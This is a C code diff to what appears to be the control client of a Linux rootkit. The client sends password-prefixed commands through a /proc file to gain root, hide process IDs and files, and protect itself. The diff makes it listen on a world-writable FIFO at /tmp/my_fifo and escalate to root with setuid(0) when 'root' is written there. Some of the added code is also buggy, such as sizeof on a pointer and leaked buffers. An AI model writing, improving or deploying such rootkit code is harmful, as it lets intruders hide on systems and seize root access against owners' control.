@@ -171,49 +171,101 @@ void write_buffer(char **dest_ptr, char *src, size_t size)
     *dest_ptr += size;
 }
 
+int word_count(char *s){
+    int i;
+    int count = 1;
+
+    for (i = 0;s[i] != '\0';i++){
+        if (s[i] == ' ')
+            count++;    
+    }
+
+    return count;
+}
+
+void parse_input(char *pkt, char **arg1, char **arg2){
+    printf("parse_input");
+    int count = word_count(pkt);
+    printf("%d\n", count);
+
+    if(count > 1){
+        *arg1 = strtok(pkt, " ");
+        *arg2 = strtok(NULL, " ");
+    }
+    else {
+        *arg1 = strtok(pkt, " ");
+    }
+}
+
 void read_from_pipe(char *pipe_name, char *pipe_buf){
     
     /*  Clear buffer */
-    memset(pipe_buf, 0, sizeof(pipe_buf));
+    memset(&pipe_buf[0], 0, sizeof(pipe_buf));
 
-    /* Open pipe */
     int pipe_fd = open(pipe_name, O_RDONLY);
-
     read(pipe_fd, pipe_buf, MAX_BUF);
-    printf("Received %s\n", pipe_buf); 
     close(pipe_fd);
 }
 
+int root;
+int hide_pid;
+int unhide_pid;
+char *pid;
+int hide_file;
+int unhide_file;
+char *file;
+int hide;
+int unhide;
+int protect;
+int unprotect;
+
+void action();
+
 int main(int argc, char **argv)
 {
-    int root;
-    int hide_pid;
-    int unhide_pid;
-    char *pid;
-    int hide_file;
-    int unhide_file;
-    char *file;
-    int hide;
-    int unhide;
-    int protect;
-    int unprotect;
 
-    int pipe_fd;
     char *pipe_name = "/tmp/my_fifo";
+    /* char pipe_buf[MAX_BUF]; */
     char pipe_buf[MAX_BUF];
+    char *arg1 = malloc(32);
+    char *arg2 = malloc(256);
 
     /* create pipe */
     mkfifo(pipe_name, 0666);
 
-    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
-                                  &hide_file, &unhide_file, &file, &hide, &unhide,
-                                  &protect, &unprotect);
+    while(1){
+        /*  read from pipe, while loop till pipe has args */
+        read_from_pipe(pipe_name, pipe_buf);
+        printf("received %s\n", pipe_buf); 
+
+        /*  parse input for arguments */
+        parse_input(pipe_buf, &arg1, &arg2); 
+
+        printf("Arg1: %s, len: %d\n", arg1, (int)strlen(arg1));
+        printf("Arg2: %s, len: %d\n", arg2, (int)strlen(arg2));
+
+        if (strcmp(arg1, "root") == 0){
+            root = 1;
+            action();
+        }
+        if (strcmp(arg1, "touch") == 0){
+            printf("touching\n");
+            mkfifo("/opt/test", 0666);
+        }
+
+    }
+
+    return 0;
+}
+
+void action(){
 
     size_t buf_size = 0;
 
     buf_size += sizeof(CFG_PASS);
 
     if (root) {
+        printf("root\n"); 
         buf_size += sizeof(CFG_ROOT);
     } else if (hide_pid) {
         buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
@@ -273,7 +325,8 @@ int main(int argc, char **argv)
 
         if (fd < 1) {
             fprintf(stderr, "Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
-            return 1;
+            printf("Error: Failed to open %s\n", "/proc/" CFG_PROC_FILE);
+            exit(1);
         }
 
         write(fd, buf, buf_size);
@@ -285,8 +338,7 @@ int main(int argc, char **argv)
     free(buf);
 
     if (root) {
-        execl("/bin/bash", "bash", NULL);
+        /* execl("/bin/bash", "bash", NULL); */
+        setuid(0);
     }
-
-    return 0;
 }
